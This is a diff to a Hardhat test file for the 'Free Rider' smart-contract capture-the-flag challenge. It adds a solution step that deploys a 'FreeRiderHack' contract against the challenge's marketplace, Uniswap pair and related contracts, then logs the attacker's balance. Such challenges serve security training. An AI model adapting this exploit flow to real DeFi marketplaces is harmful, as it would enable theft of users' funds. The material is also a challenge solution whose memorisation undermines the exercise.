@@ -125,6 +125,24 @@ describe("[Challenge] Free Rider", function () {
   });
 
   it("Execution", async function () {
+    const hacker = await (
+      await ethers.getContractFactory("FreeRiderHack", player)
+    ).deploy(
+      nft.address,
+      weth.address,
+      uniswapPair.address,
+      marketplace.address,
+      devsContract.address
+    );
+
+    await hacker.connect(player).hack(NFT_PRICE);
+
+    console.log(
+      "Attacker ETH balance:",
+      String(await ethers.provider.getBalance(player.address))
+    );
+
+    //deploy the contract FreeRiderHack.sol
     /** CODE YOUR SOLUTION HERE */
   });
 
